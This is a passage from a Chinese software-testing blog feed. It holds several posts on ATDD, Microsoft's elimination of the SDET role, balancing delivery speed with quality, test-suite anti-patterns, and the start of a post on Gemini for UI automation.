Development\n什么是ATDD?\n说实话，这个概念我也是第一次见到。\nWhat are the key steps involved in ATDD?\nATDD的关键步骤有哪些？\nThe key steps involved in ATDD are:\nCollaboration among developers, testers, and business stakeholders to define acceptance criteria. Creation of acceptance tests before the development starts, based on the agreed-upon criteria. Development of the feature or user story, guided by the acceptance tests. Continuous Integration to ensure that code changes are automatically tested against the acceptance tests. Refinement of the acceptance tests as necessary, to address changes in requirements or understanding. Test Execution to validate that the software meets the agreed-upon acceptance criteria. Review and Feedback from stakeholders to confirm that the acceptance tests cover the desired functionality and behavior. Iteration through these steps as needed until the feature meets the acceptance criteria. Acceptance tests are typically automated to facilitate frequent execution and regression testing. The tests are written in a language that is understandable by all parties involved, often using Behavior Driven Development (BDD) frameworks like Cucumber or SpecFlow. This ensures that the tests serve as both specification and validation.\n1 2 3 4 5 Feature: User login Scenario: Valid login Given I am on the login page When I enter valid credentials Then I should be redirected to the dashboard Effective ATDD requires a strong collaboration culture, clear communication, and a commitment to quality from all team members.\n稍微阅读理解一下，发现所谓的ATDD的流程大概是\n定义测试条件和范围 写用例 根据用例来写代码 重复上面的步骤 根据需求变更来修改用例 根据用例进行测试 根据客户的反馈来判断用例是否覆盖了全部的需求 重复上面的步骤，直到产品交付 这里的用例基本上用的是特定的DSL来写的，也就是有自己的语法，一般常用的就有BDD框架支持的语法，比如上面列举的那样。\n概念不新鲜，其实是bdd的一种，不过换个名字就真的不认识了。\n总结 这个wiki的内容非常全面，大部分常见的软件测试内容基本上里面都有涵盖 里面的内容的准确性需要自己评估，毕竟世界上没有完全正确的观点 适合入门以及转码的小伙伴仔细研读，主要关注跟测试流程相关的部分 高手和有经验的同学可以用来查缺补漏 面试之前可以突击看一下，一些高级岗位可以重点关注里面跟指标相关的部分 ","date":"2024-01-09T16:59:55+08:00","permalink":"zh.ethanhan.cc/p/%E6%8E%A8%E8%8D%901%E4%B8%AA%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E6%B5%8B%E8%AF%95wiki/","title":"推荐1个很有用的测试wiki"},{"content":"看到一篇梳理微软的QA变迁史的文章，之前只听说过微软曾经直接干掉了所以的qa角色，不过也只是道听途说而已，这篇文章见微知著的以内部qa的视角描述了整个演进的过程，并对最终的结果进行了描述，还是非常有参考价值的。原文在这里：https://blog.pragmaticengineer.com/how-microsoft-does-qa。 下面是中文翻译。\nSDET角色 SDET（软件开发测试工程师）角色是微软在技术行业中首创的。他们是专注于编写自动化测试、构建和维护测试系统的软件工程师。SDET与软件开发工程师（SDE）唯一的区别在于，SDET通常不编写生产代码，而是编写测试代码，并与SDE在同一个团队中工作。\n我无法追溯该角色的确切引入时间，但很可能是在1990年代。例如，这是微软Exchange团队的一位成员在2004年发表的一篇帖子，解释了在他们组织中成为SDET的含义：\n“SDET是一位在测试团队而非开发团队工作的开发人员。SDET具备测试员的敏锐感，同时喜欢编写大量代码。\nSDET通过提供必要的工具和流程，使测试人员能够充分发挥他们的优势\u0026hellip;在产品上市之前，尽可能多地测试产品并发现尽可能多的错误。\nSDET具备分析产品功能和架构的能力，从而设计和实现有助于测试的工具。\nSDET喜欢短期项目生命周期，在一年内设计和实现许多工具和测试框架，使用最新技术，并有充分的创新空间。\n尽管产品质量是首要关注的问题，但SDET在产品生命周期末期不会像开发人员那样感到压力。通俗地说\u0026hellip; SDET很少会面临风险:)”\n微软为SDET角色设定了正式的职业发展路径。同一篇帖子中写道：\n“[SDET职位]有很大的发展空间。如果你喜欢作为SDET所做的工作，你可以发展成为测试架构师。如果你想参与管理工作，那么你可以逐步晋升为SDET主管，然后成为测试经理。\n如果你只想编码而不参与测试工作，你可以选择成为开发人员的道路。许多人选择了这条道路。如果你意识到你的心属于测试，那么你可以成为一名测试员。”\n直到2014年左右，SDE和SDET之间的比例在微软内部普遍为2:1。在2012年我所在的Skype for Xbox One团队也是如此。以下是我们团队的人员构成，根据员工人数计算：\n12名SDE（软件开发工程师） 6名SDET（软件开发测试工程师） 2名PM（产品经理） 1名EM（工程经理） 1名SDET主管\n在我们的项目中，SDET团队负责所有测试的方面：\n手动验证开发人员构建的功能是否按预期工作，包括可能没有考虑到的边界情况。 构建集成和端到端测试以自动化检查。 创建手动测试计划，并在重要的里程碑之前执行。 在功能规划阶段参与其中，提出边界情况的想法以及如何验证工作的方式。 解决一些棘手的问题，例如如何在Xbox硬件上可靠地进行Skype产品的性能基准测试。 在早期，单元测试是一个引发争议的问题。谁应该编写它们？一些有经验的开发人员来自游戏行业，游戏开发人员通常不编写自动化测试，他们认为任何自动化测试，包括单元测试，都应该由SDET团队完成。我们在《游戏开发基础》中详细介绍了游戏的构建过程，并在《构建一个简单的游戏》中进行了实际操作。\n那些之前构建过应用程序或进行过测试驱动开发（TDD）的人认为这种方法是错误的，开发人员应该编写自己的单元测试，因为单元测试与代码是紧密耦合的。我属于这个阵营。\n有专门的SDETs使得开发人员“外包”单元测试的写作成为一个诱人的选择。 我现在就要说了：如果没有SDET团队，关于谁来编写单元测试的问题将不会成为争论的焦点：我们开发人员将不得不自己编写它们。这是我在每个有指定SDET的团队中都看到的一场反复争论。令人惊讶的是，即使在今年，我还听说过一个硅谷公司的开发团队让测试团队编写单元测试的情况！\n在我们的情况下，我们决定由开发人员编写单元测试，而SDET团队负责其他所有工作。这种方法运行得还不错，但其中有一些令人难忘的特点：\n\u0026ldquo;我们和他们\u0026quot;的动态关系导致了分裂。当我们开发人员完成一个功能时，我们将其交给SDET，通常会发现问题，所以功能会回到开发人员手中进行修复。这让开发人员感到很烦恼，因为这会导致我们可能没有预料到的工作。随着时间的推移，开始感觉就像有两个团队，拥有不同的目标，不总是朝着同一个方向努力。 开发和测试之间的问题往返。我完成了我的功能工作，并将其发送给测试（ping）。测试人员在第二天找到一个错误，并将其发送回给我（pong）。我修复了错误，并在几天后再次发送（ping）。测试人员又找到了另一个错误并将其发送回给我\u0026hellip;这种来回发生的次数比我愿意承认的要多！ 开发人员擅长构建复杂系统，并且可以为SDET提供很多帮助。我们的SDET团队已经花了几个月时间构建一个集成测试系统，进展缓慢。我们的团队真的需要这个系统，因为手动测试太耗时了。最后，一位资深工程师建议开发人员加入其中，一起构建这个系统，作为一个团队。两周后，在经验丰富的开发人员的带领下，系统成功运行起来。这让我思考：如果没有开发/测试的分裂，团队是否会工作得更好？我们刚刚证明了这一点。 房间里的大象：一些开发人员看不起SDET角色。虽然并非所有人都这样认为，但很明显，许多开发人员认为SDET的工作不如他们自己的工作具有挑战性。SDETs也知道，通过转向开发角色，他们可以获得更好的职业发展机会。 事实证明，他们不需要等那么久才能晋升。\n2014年初，我加入了Skype网络团队——这支“日更”团队完全颠覆了我对Skype的认知，他们每天都在发布新版本软件，而不是像其他团队那样按月发布。\n团队架构乍一看是6名软件工程师和3名测试工程师，但实际上只有一个“假身份”测试工程师。团队领导悄咪咪地做了一个大胆的决定：既然每天都要发布新功能，单独设置测试岗位根本没必要。我在另一篇文章中讲述了这个未公开的变革，标题是“科技巨头如何管理技术项目以及Scrum的意外缺失”。\n刚加入团队时，我们遵循两周的敏捷开发流程，采用标准的Scrum仪式，工程师和测试工程师也分得清清楚楚。但是，两周的发布周期还是太长了，我们希望能更快地迭代。\n于是，我们做出了一个悄然改变：让所有测试工程师也参与构建生产软件，每个工程师都对自己的代码负责，测试和开发融为一体。这样一来，我们就不用再花几天时间等待测试反馈，新功能就能迅速上线。不过，两个星期一次的冲刺和冗杂的Scrum仪式又成了新的瓶颈。\n干掉SDET角色 2014年初，我加入了Skype网络团队——这支“日更”团队完全颠覆了我对Skype的认知，他们每天都在发布新版本软件，而不是像其他团队那样按月发布。\n团队架构乍一看是6名软件工程师和3名测试工程师，但实际上只有一个“假身份”测试工程师。团队领导悄咪咪地做了一个大胆的决定：既然每天都要发布新功能，单独设置测试岗位根本没必要。我在另一篇文章中讲述了这个未公开的变革，标题是“科技巨头如何管理技术项目以及Scrum的意外缺失”。\n刚加入团队时，我们遵循两周的敏捷开发流程，采用标准的Scrum仪式，工程师和测试工程师也分得清清楚楚。但是，两周的发布周期还是太长了，我们希望能更快地迭代。\n于是，我们做出了一个悄然改变：让所有测试工程师也参与构建生产软件，每个工程师都对自己的代码负责，测试和开发融为一体。这样一来，我们就不用再花几天时间等待测试反馈，新功能就能迅速上线。不过，两个星期一次的冲刺和冗杂的Scrum仪式又成了新的瓶颈。\n我们通过从团队中移除SDET角色变得更加高效！SDETs仍然主要专注于与测试相关的工作，但也承担起了开发任务。同样重要的是，我们进行了很多配对工作！我记得和SDETs一起构建一个功能。我擅长思考如何使某个东西正常工作，而SDET非常擅长指出我没有考虑到的边界情况。在调试方面，SDETs的机智能力让我感到惊讶。\n在微软的大多数团队中，SDETs花费很多时间手动测试和编写集成测试。但在我们的团队中，手动测试非常少，我们都建立了集成测试基础设施和监控基础设施。当开发人员或SDET接手一项工作时，他们编写所有的测试-单元测试和集成测试-这是有道理的。\n这个变化的最好之处是不再有“我们对他们”的对立。关于是否修复SDET发现的错误的争论停止了，因为现在我们自己进行测试并修复我们发现的错误，然后再发布到生产环境中。\n微软的Web团队开始悄悄地移除SDET角色。回到2014年，伦敦Skype办公室的我们的Web团队感到“特别”，因为唯一合并SDET职能的其他团队都是基于Web的团队，而这样的团队并不多。在其他团队中，SDETs继续按照他们过去的方式工作。\n然而，合并这些角色以提高效率不仅仅发生在Skype部门的Web团队中。Web团队独立地意识到合并SDET和开发角色可以让他们更快地前进，所以这一变化在整个微软都发生了！\n在2014年中期，微软正式废除了SDET角色，并引入了SE角色。灵感显然来自于微软的一个更大的Web团队，即Bing团队。根据Ars Technica在2014年的报道：\n“在Bing团队中，创建程序化测试的任务转移到了开发人员身上，而不是专门的测试人员。质量保证仍然存在且仍然重要，但它执行的是“真实世界”样式的最终用户测试，而不是程序化自动化测试。这种测试对于Bing来说非常成功，提高了团队在不损害整体软件质量的情况下发布更改的能力。”\n在2014年7月，微软宣布将进行迄今为止最大规模的裁员，裁掉公司员工中的18,000人，总共有127,000名员工。其中12,500人是诺基亚部门的裁员。作为这次裁员的一部分，大量的SDET职位也被取消。这发生在SDET角色被宣布退休的同时，现有的SDETs需要在接下来的几个月内转入软件开发工程师（SDE）职务。SDE角色也被更名为SE-软件工程师。\n这个转变进展如何？据我所了解，情况还不错。对于每天发布产品的团队来说，这个变化非常合理。而在微软内部，每周或每月发布产品的团队越来越少，因为微软也倾向于采用软件即服务（SaaS）模式。当然，微软仍然是Windows操作系统系列和Surface平板电脑的供应商。在这两个领域，质量的要求与SaaS产品不同。\n关于这个变化的一个很好的描述来自于2017年的Visual Studio Team Services团队，也就是这个变化发生三年后。回顾这个变化，目前担任微软技术专员的Brian Harry写道：\n“两年前（2015年），我们有数万个测试。这些测试是由‘测试人员’编写来测试‘开发人员’编写的代码。虽然这种模式有一些优点，比如明确可衡量和可控制的测试投资、测试学科的专业知识和职业发展等，但也存在许多缺点，如开发人员缺乏责任感、反馈周期慢（引入错误，发现错误，修复错误）、开发人员对于使其代码“可测试”没有太大动力、代码架构与测试架构之间的分歧导致重构和转变非常困难和昂贵，等等。（\u0026hellip;）\n完整的测试需要花费大部分时间来运行，还需要更多小时来“分析结果”以识别错误的失败，并需要几天或几周来修复由于产品中的一些合理变更而导致的所有测试失败。（\u0026hellip;）两年前，我们开始了完全重建测试的道路。\n我们将开发和测试组织合并为一个统一的“工程”组织。在很大程度上，我们消除了编写代码和测试代码的区别。这并不是说每个人都要做相同数量的工作，但每个人都要做一些不同的工作，并对其所产出的质量负责。我们还决定完全放弃花费8年时间创建的数万个测试，并用完全不同的方式进行替换。”\n这个团队评估了他们当前所使用的测试类型，并决定他们不喜欢现有的情况，即小型单元测试较少，而复杂且难以维护的端到端测试较多。因此，他们进行了改变：\n以下是团队测试在两年时间内的变化的另一种可视化方式：\n在两年时间内，几乎所有在测试与开发分离时的“旧”测试都消失了。新的测试也变得更加细分。数据来源：微软开发博客\n那么，最终这一切的努力是否值得呢？根据Brian的说法，是的。他在当时写道：\n“我们开始从提高质量、敏捷性和工程师满意度等方面受益。”\n","date":"2024-01-09T16:24:18+08:00","permalink":"zh.ethanhan.cc/p/%E5%BE%AE%E8%BD%AF%E7%9A%84qa%E5%8F%98%E8%BF%81%E5%8F%B2/","title":"微软的QA变迁史"},{"content":"软件开发的节奏和期望在最近的时期急剧升级。以前，团队会提前几个月规划大多数软件产品的交付周期。瀑布式开发方法是开发软件的主流方法，并且许多组织在不同行业广泛采用了这种方法。例如，Microsoft Windows操作系统的开发在上市之前需要数年时间。即使是以服务包形式的增量更新也需要数年才能发布。\n在当今快节奏的环境中，任何花费数月或数年时间向客户交付新功能的组织都将被抛在后头。构建和部署软件的方法发生了巨大变化，大多数公司采用了快速开发周期以保持竞争力。回到上面提到的例子，Microsoft近期的Windows版本转向滚动更新，而不是等待多年才发布新功能。这一举措使得公司能够定期和频繁地推出变化，而不是让消费者等待数年。\n这种尽快构建和频繁交付的加速周期对于消费者来说非常有利，他们可以在应用程序的主要版本之间没有长时间等待的情况下获得最新和最好的软件。然而，产品开发团队面临的压力可能导致他们采取捷径和省略步骤。在许多情况下，由于高要求导致的质量和稳定性的牺牲会导致产品存在错误，从而使客户不愿使用。\n初创公司和小公司最容易受到快速交付的负担和困扰。在这种环境下，这是一种必要的恶。当你在一个小团队中努力工作，希望将新的创新产品推向世界时，你需要频繁迭代你的产品，将其塑造成能够使你的业务生存下去的东西。通常，这意味着更加强调快速发布周期，为初创公司留下更少的时间和资源进行测试。较大的公司通常有更多的时间和资金用于质量，但以延长的开发和部署周期为代价。\n大多数组织认为他们可以通过速度或质量来应对，但这种策略只能在短期内起作用。对于初创公司来说，快速交付周期可以帮助他们更快地迭代和修复错误，但随着时间的推移，所有这些捷径将累积成巨大的技术债务，使开发变得更加缓慢和困难。较大的组织将建立稳定软件交付的流程，但缓慢的交付速度将使竞争对手超越他们。软件团队需要同时具备速度和质量，才能应对现代软件时代客户的高要求。\n软件开发中速度的重要性 正如本文已经指出的，速度对于保持软件开发的长期业务计划至关重要。在争夺消费者有限的注意力方面，竞争异常激烈，对许多组织来说，以较慢的速度工作以确保准确性已经不再可接受。未能迅速工作和适应将不可避免地面临挑战。应用程序中过时的功能可能导致客户转投其他地方，这导致消费者和市场份额的损失，最终不可避免地以失败告终。\n多年来，我们见证了无数组织因无法跟上技术进步或对其不感兴趣而失败。例如，在90年代和2000年代初，诺基亚是手机的代名词。但是当苹果推出iPhone并且谷歌随后推出Android时，诺基亚选择坚持其现有软件平台，而不是加入消费者想要的更现代和先进的移动生态系统。该公司在接下来的几年中迅速失去了超过90％的市值，再也没有恢复其在该市场细分中的地位。\n然而，快速前进也带来一些风险。过快发展的其中一个更危险的风险是花费数月或数年时间来构建人们不需要的东西。大多数初创公司无法生存，因为他们的创始人无法找到产品与市场的契合点，使他们的软件可持续发展。大型组织在新产品方面也面临这个问题，比如谷歌。该公司在2013年推出了Google Glass，虽然许多人对该设备着迷，但谷歌未能弄清楚为什么大多数人愿意为该产品支付1500美元。该公司也没有花时间考虑隐私和安全问题，试图快速进入市场。结果，该产品成为谷歌最引人注目的失败之一。\n急于上市的最明显风险是可能导致产品发布时尚未完全完成。我们经常在软件和硬件产品中看到这种情况。例如，苹果在2012年发布了苹果地图，试图替代其设备上的谷歌地图服务。然而，该产品显然还没有准备好，存在大量错误、不准确的导航和缺失的数据。另一个例子是微软因其发布的Windows Vista而受到严厉批评，该系统运行缓慢且不稳定，许多项目开发人员将这些问题归咎于匆忙的发布计划。\n为了解决这些问题，组织通常需要暂停一下，审视他们如何处理产品质量的问题。\n软件开发中质量的重要性 软件质量是软件开发生命周期中非常重要但常常被忽视的部分。每个人都希望产品具有最高的质量，但很少有人在追求速度时给予足够的重视。许多开发团队对测试和质量保证流程口头上多有讲究，但没有采取实际行动。在某些团队中，尤其是在“快速打破事物”的时代，有时会将质量视为快速开发的直接相反，但这与事实相去甚远。\n本文前面提到的一些例子讨论了为什么质量至关重要。当您加快应用程序的开发并忽略质量问题以便更快地推出产品时，随之而来的问题将不可避免地导致系统故障、安全漏洞和对您品牌的信任不足。我们经常看到新闻中的许多组织由于质量差而遇到困难和危机，从初创公司到科技巨头都有。\n专注于质量并不是解决这些问题的万能解决方案。事实上，过于专注于某一方面可能对开发过程产生不利影响。除了导致发布计划放慢并且远远超过截止日期之外，过于严格的质量保证政策还可能导致团队士气下降。我曾在一家初创公司工作过，他们将质量保证团队设为我们是否能够发布网页应用程序更新的门槛。他们的标准相对较高，即使是小问题也完全阻止了部署。开发和质量保证之间的来回反复随着每次进度滑坡而变得紧张。开发人员和测试人员都没有在公司呆很长时间，员工流动是该初创公司不存在的原因之一。\n在某些行业中，质量是绝对必要的。您不希望使用实验室没有经过彻底测试的心脏起搏器，也不希望使用没有经过安全专家审计的互联网银行。但在软件行业中，现实情况是，大多数开发人员正在构建的是没有任何巨大影响的网络或移动应用程序，即使产品不像预期那样始终正常工作。您可能会因为偶尔的小错误或可用性问题而冒失去客户的风险，但我们很少遇到在软件中会产生不利现实影响的问题。大多数时候，它们只是小小的烦恼，不会导致客户大批离开。\n作为软件开发人员和测试人员，我们不希望放慢速度或发布有错误的软件。我们需要学会如何正确平衡速度和质量。\n在软件开发中平衡速度和质量 过快进行开发和测试会导致质量问题，但过于关注质量可能会拖慢整个过程。关键是根据项目当前的状态找到合适的速度和质量平衡点。当然，安全地进行快速迭代测试和部署应用程序并不容易，但通过投入时间和精力是可以实现的。\n以下是您可以在组织中实施的五种策略，有助于在所有应用程序中实现速度和质量的正确平衡。\n1）自动化测试 大多数软件团队都有测试流程，但通常他们将这些流程视为次要任务，与构建功能和修复错误相比，它们的重要性不大。即使在2023年，我与许多团队合作时，他们仍然主要进行手动测试，仅在部署前进行测试，这是一个缓慢、繁琐且容易出错的过程，导致问题被忽视。自动化这些重复性任务可以显著提高效率，通过消除它们并更快地捕捉到回归问题。自动化测试并不能取代手动测试，但它确实有助于提高应用程序的速度和质量。\n尽管自动化测试可以帮助开发人员和测试人员更快地完成任务，但如果团队在整个产品生命周期中没有密切关注它，它可能成为一个障碍。我曾见过一些团队夸耀他们有成千上万个自动化测试用例，但仔细检查后发现自动化并没有像他们想象的那样帮助他们。团队可能在覆盖范围上存在巨大的空白，或者他们没有测试应用程序的高商业价值部分。测试套件运行时间也很长，并且由于不稳定性而经常失败，导致他们花费更多时间修复测试套件，从而占用了宝贵的时间。关键是确保自动化测试能够很好地平衡速度和质量，以帮助团队快速交付并尽快解决问题，以防止平衡倾斜到一侧。\n2）持续集成/持续部署 应用程序的自动化测试很好，但如果您或您的团队不经常运行这些测试，那么构建它们就是浪费时间。我在职业生涯中与数百名开发人员和测试人员合作的经验表明，很少有人在本地运行其应用程序的自动化测试套件。持续集成环境对于任何希望在快速交付产品时感到自信的组织来说都至关重要。一个良好构建的持续集成系统将尽早尽可能频繁地运行自动化测试，以便在问题变得更容易修复和更便宜时捕捉到潜在问题。\n在设置持续集成环境以自动化测试之后，下一步是研究持续部署以自动化软件发布。\u0026ldquo;持续部署\u0026quot;通常指的是当代码库中有任何新更改时自动部署应用程序。这种策略并不适用于所有人，因为它需要大量的时间、精力和信任来安全地实现。但采用这种方法的团队在其流程中构建了所需的高质量，从而在竞争中获得巨大的优势。如果一个团队出于任何原因不愿意自动化其部署，他们至少应该有改进部署流程的流程，因为这将迫使速度和质量保持良好的平衡。\n3）功能开关 功能开关是一种软件开发策略，允许团队在不更改底层代码的情况下设置可以打开或关闭的行为。通常，开发人员使用这种技术来构建和发布他们不希望在各个环境中广泛提供的功能，直到他们可以进一步开发和测试。这样，团队可以逐步以小规模发布功能，并在生产环境中进行测试，而不会造成系统中断。\n功能开关是在应用程序中平衡速度和质量的一种绝佳方式，因为它们允许团队在发布给大众之前在内部或与部分客户测试和实施新功能。测试人员可以拥有一个界面，可以在没有开发人员介入的情况下安全地切换代码库的不同部分。缺点是太多的开关可能会导致代码库混乱，并对开关背后的功能产生潜在的混淆。然而，合理使用这种方法可以使团队收集反馈，降低风险，并快速解决问题，同时增加部署高质量解决方案的信心。\n金丝雀部署 许多组织通常会同时向所有用户发布新功能和功能。虽然这样可以使团队更快地部署，但可能会牺牲质量，特别是对于没有许多自动化测试或将持续集成纳入其工作流程的团队。即使有这些系统存在，由于开发、测试和部署阶段之间的差异，仍然存在出现问题的风险。开发人员可能会发现他们的应用程序在他们的计算机上运行得非常好，或者测试人员在测试环境中找不到问题，但由于微小的差异，应用程序在生产环境中出现问题。 金丝雀部署通过逐步将应用程序的部署提供给一部分用户，然后再向所有人提供，有助于减少这种风险。这个过程允许团队监控新功能的真实使用情况，并收集数据来确定变更的安全性。这些部署与特性标志略有相似之处，但工作在应用程序级别，因为流量在应用程序的旧版本和新版本之间进行划分。一切看起来都很好之后，团队可以将所有人重定向到最新版本的应用程序，并删除以前的版本。金丝雀部署需要一些前期工作，包括监控和可观察性系统，以跟踪部署后的系统行为。这些部署可能会使团队的速度变慢，因为他们必须等待完全部署任何变更。然而，确保质量所需的努力和时间最终会在未来提高速度。\n团队之间的合作 在开发过程中，要在质量和速度之间取得平衡，并不是所有事情都需要技术解决方案。对于希望快速而安全地发布产品的任何组织来说，跨所有参与软件开发生命周期的团队（开发人员、质量保证和运维）建立协作文化至关重要。这些团队之间的相互联系将通过消除障碍和潜在的沟通问题，从头到尾创建一个流畅高效的工作流程，从而提高速度和质量。自动化测试、持续集成/持续交付、特性标志或金丝雀部署在产品的所有团队没有达成一致的情况下并不重要。 当团队紧密合作时，他们可以确保每个人都在做正确的事情，并提出比独立工作更好的解决方案。例如，测试人员通过识别开发人员在开发过程中没有考虑到的潜在弱点和边界情况来帮助开发人员，运维团队可以更轻松地为测试人员设置测试环境。这种合作努力必然会带来改进的产品，因为它们将不同的观点和专业知识融入到讨论中。当每个人共同努力时，他们可以完成比每个人单独所能做的更多的事情。 结论 团队可以尝试本文中讨论的一些或全部想法，努力实现速度和质量的良好平衡。您的组织可以从改进自动化测试和实施持续集成开始采取小步骤。一旦您开始注意到开发和质量保证的工作速度更快且问题更少，团队可以引入功能开关和金丝鸟部署，以帮助更顺畅、更高效地发布。即使您不实施这些策略中的大部分，紧密的跨团队合作将成为整个过程中最重要的组成部分。如果没有坚实的合作，您将无法取得很大进展。\n在追求工作速度和确保产品高质量之间找到适当的平衡并不容易。这需要组织内各个部门之间的大量努力和协调，包括开发、测试等等。当您努力实现这种平衡时，不要期望变化会立即发生。团队必须明白这是一个缓慢的过程，如果需要时间才能看到结果也是可以接受的。知道进展不会一夜之间发生是改善事物的第一步。通过努力采用本文提到的策略，您将更接近找到速度和质量的完美平衡点。\n","date":"2023-12-21T18:58:55+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E5%9C%A8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E5%AE%9E%E7%8E%B0%E9%80%9F%E5%BA%A6%E5%92%8C%E8%B4%A8%E9%87%8F%E7%9A%84%E5%B9%B3%E8%A1%A1/","title":"如何在软件开发中实现速度和质量的平衡"},{"content":"看到一篇吐槽测试用例的文章https://itnext.io/the-worst-test-suite-testing-anti-patterns-experienced-in-real-life-24fd13ee3ddd，觉得挺有意思的，没啥新意，不过也确实是我们会遇到的问题，或者说是我们生活的一部分。顺手翻译了一下，下面是文章内容。\n我认为这里不需要介绍，我将告诉您我遇到的最糟糕的测试套件(testsuit)是什么样子，以及它是如何运作的。\n我提前警告您，这篇文章会让您感到恶心，皮肤发痒，工程技能受挫。\n我将介绍的反模式将以恶心程度进行排名，从🤮表示糟糕到🤮🤮🤮表示完全不可原谅。 所有的反模式都很糟糕，但其中一些我从未在其他地方见过，我认为对它们进行排名将强调它们的隐蔽性。\n在阅读本文时，整个套件大约有10个测试文件。其中9个是“合理的”，第十个则是一场噩梦：它有大约3000行代码，总共组合了约80个测试用例。测试套件的约95%都在这个文件中。\n除了测试用例之外，测试使用的所有工具都散落在这个文件中。\n混合测试类型 恶心程度: 🤮\n该文件包含了许多不同类型的测试——从单元测试到组件测试，再到端到端测试。有些测试非常难以确定测试类型——有些单元测试通过运行系统的主要部分来测试特定的小功能，而在其他情况下，通过调用系统的内部功能序列来执行主要的端到端测试。\n为什么测试被编号？ 恶心程度: 🤮🤮🤮\n所有的测试名称都被编号了！所有的测试都采用了TestXX_what-the-test-checks的形式。\n这是一个重要的警示信号，当我加入这个项目时，我没有完全意识到它的重要性。大约工作了两个月后，显然这些测试之间的顺序是有问题的！这些数字是为了强制排序而存在的。这些测试是相互依赖的。\n不用说，当我移动一些测试以使那个庞大的文件变得更清晰时，我是以艰难的方式学到了这一点。\n如果我想添加一个测试，它必须与其他测试正确排序。这创造了一种荒谬的情况，我必须正确命名测试以便按正确的顺序运行。因此，如果我想让一个测试在Test34_XXX和Test34_YYY之间运行，我必须将我的测试命名为Test341_ZZZ，以确保字典顺序正确 🤯\n匿名测试 恶心程度: 🤮\n关于测试名称，还有一件事——其中一些是匿名的——这些测试并没有说明它们实际覆盖的内容，例如：test19_requirement_59_passes或者最受欢迎的test87_process_works。\n有些测试只有在我引入了使它们失败的更改后，我才知道它们测试的是什么，这迫使我进行调查工作以弄清楚它们在做什么。\n(这不是原文，这只是我的补充：这种情况就是测试用例的名字没有任何的意义，没人知道这个用例在做什么)\n断言？它们只是建议 恶心程度: 🤮🤮🤮\n一些测试没有以断言结束。您当然会问一个没有断言的测试在做什么？\n在这些测试中，测试的顶部有一条注释，指示“用户”去做某事。通常是像“转到日志文件并检查是否存在格式为X - Y - Z的日志消息”。\n不用说，这并没有说明日志文件在哪里，如果有多个文件（由于日志轮换配置）该怎么办。而且，在某些情况下，这些说明已经过时，日志消息自“测试”和其说明编写以来已经发生了变化。\n这些测试显然总是通过的，项目移交期间没有人告诉我这些事情，我是在添加一个功能时偶然发现有一个测试，其名称表明它测试的是我实现的过时功能的相反面。它显然通过了（因为它没有断言）。\n我删除了所有这些测试，再也没有回头看过。\n(这不是原文，这只是我的补充：这种情况就是只执行动作不做断言，基本上大部分同学入门的时候都会经历这个阶段。)\n复杂和隐晦的输入 恶心程度: 🤮\n系统的测试输入相当复杂，大多数测试都基于一个单独的输入文件。除了“刚好足够让测试通过”的输入之外，它包含的内容相当隐晦。没有人真正记得这个测试文件是如何创建的。\n为了将每个测试带到相关状态，散布在3000行代码中，有一些实用方法来操作输入文件。它们都没有解释它们的作用，通常被称为prepare_for_test78之类的名称。\n每当我们需要更改输入时，我们都会有点儿心痛 🥲\n(这不是原文，这只是我的补充：这种情况就是准备的数据不具备可读性，没人知道这些数据是做什么的。)\n拖累的共享状态 🤮恶心程度: 🤮🤮\n不仅测试彼此相互依赖，被测试的系统本身也在测试之间拖累了一些内部状态。\n原始作者没有在每个测试之前重新创建系统，而是添加了一组方法，使测试驱动程序能够将内部状态置为null。\n入口不明确 恶心程度: 🤮🤮\n有一些测试调用了内部函数，并按照特定顺序调用——实际上很难确定测试的入口是什么。事实证明，所有这些调用的函数散布在不同的类中，影响了一些最终被测试的内部共享状态。\n最后的思考 是的，这是一个真实的故事。 是的，有点夸张，但只是一点点。\n我不知道这个测试套件是如何变得如此糟糕的，但我认为只是出于善意。\n这个项目在很长一段时间内处于POC阶段，并且直到后期才成为任何人关注的焦点或优先事项，这可能可以解释，但我不知道。\n幸运的是，被测试的系统相对简单。除了复杂的输入之外，逻辑本身并不太难理解和推理。这使得在这些条件下工作成为可能。 如果系统稍微复杂一些，情况可能会更糟。\n话虽如此，也许系统足够简单是导致测试套件变得如此糟糕的原因？\n我们尽力改善情况，但我们主要是尽量不要让情况变得更糟。所有新开发的内容都要符合更高的标准，我们决定尽量少地添加到“厄运之一文件”中。\n尽管如此，这次经历对我来说是一所了不起的学校——我学到了不应该做什么，以及做这些事情的影响。就像得了一次非常严重的肺炎，才明白在寒冷的冬天穿着T恤出门是不应该的。\n","date":"2023-12-15T10:23:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%9C%80%E6%81%B6%E5%BF%83%E7%9A%84%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B--%E7%8E%B0%E5%AE%9E%E7%94%9F%E6%B4%BB%E4%B8%AD%E7%9A%84%E5%8F%8D%E6%A8%A1%E5%BC%8F%E6%B5%8B%E8%AF%95%E8%A1%8C%E4%B8%BA/","title":"最恶心的测试用例--现实生活中的反模式测试行为"},{"content":"昨天google发布了全新的ai模型gemini，在视频里google演示了gemini近乎神奇的实时反馈能力，比如测试人员画一只鸭子，ai可以立即识别，以及后面的一些互动小游戏中，gemini展示出了出人意料的精准度和推理能力，这是令我印象最为深刻的多模态模型的实时演示了。\n珠玉在前，gpt4的文本类型的推理能力已经到达了一个相对可用的状态，基于该能力，我们也看到了一些比较有意思的自动化类型的项目，比如通过简化html输入大语言模型，让大语言模型去推断用户想要进行的操作，最终调用浏览器api进行自动化操作的项目，以及利用llm的解释器能力，一步一步推理并进行浏览器操作的项目，这些项目都非常有创意，也有一定的实用性，但是缺乏完善的多模态支持总让人觉得想象空间可能没有变得非常广阔。gemini的出现，强大的推理能力，代码生成能力以及多模态能力的结合，也许会为自动化测试领域带来翻天覆地的变化。\nUI自动化 